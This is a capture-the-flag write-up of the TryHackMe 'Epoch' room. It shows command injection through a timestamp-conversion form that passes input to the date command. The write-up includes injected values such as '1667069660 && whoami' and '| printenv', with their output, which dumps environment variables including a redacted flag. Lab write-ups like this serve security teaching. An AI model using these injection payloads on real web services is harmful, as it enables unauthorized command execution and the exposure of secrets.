@@ -1,0 +1,55 @@
+███████╗██████╗  ██████╗  ██████╗██╗  ██╗
+██╔════╝██╔══██╗██╔═══██╗██╔════╝██║  ██║
+█████╗  ██████╔╝██║   ██║██║     ███████║
+██╔══╝  ██╔═══╝ ██║   ██║██║     ██╔══██║
+███████╗██║     ╚██████╔╝╚██████╗██║  ██║
+╚══════╝╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝
+   https://tryhackme.com/room/epoch
+
+"Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!"
+
+
+
+
+Navigating to http://[Machine IP] greets us with a tool called Epoch to UTC convertor. This will take timestamps and convert them into readable dates. Give it a try:
+
+Put in 1667069660 and get the output: Sat Oct 29 18:54:20 UTC 2022
+
+This executes successfully. If we try to just put in another command (such as "whoami" or "ls", etc.), we get "exit status 1".
+We need to use multiple commands using an operator to be able to run commands on the system, and there's a couple different ones we can use:
+
+Logical OR operator (||) inbetween two commands. The first will have to be something that does not execute, so that the second will execute instead.
+Example: {{whoami || whoami}}
+
+
+date: invalid date '@whoami'
+challenge
+
+
+Logical AND (&&), which will execute both:
+{{1667069660 && whoami}}
+
+
+Sat Oct 29 18:54:20 UTC 2022
+challenge
+
+You can also use (;) or (|), there are a multitude of ways that will work for this challenge.
+
+If we click on the hint, it reads: "The developer likes to store data in environment variables, can you find anything of interest there?"
+
+Use the printenv command to display the value of environmental variables.
+
+{{1667069660 | printenv}}
+
+
+
+HOSTNAME=e7c1352e71ec
+PWD=/home/challenge
+HOME=/home/challenge
+GOLANG_VERSION=1.15.7
+FLAG=flag{REDACTED}
+SHLVL=0
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/printenv
+
+Congrats!
